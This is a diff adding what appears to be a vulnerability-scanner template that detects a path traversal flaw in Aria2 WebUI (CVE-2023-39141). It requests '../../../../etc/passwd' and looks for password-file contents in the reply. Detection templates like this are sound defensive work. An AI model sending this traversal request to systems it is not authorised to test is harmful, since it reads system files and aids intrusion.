@@ -1,0 +1,25 @@
+id: aria2-webui-path-traversal
+info:
+  name: Aria2 WebUI Path Traversal Vulnerability (CVE-2023-39141)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cve, cve2023, path-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
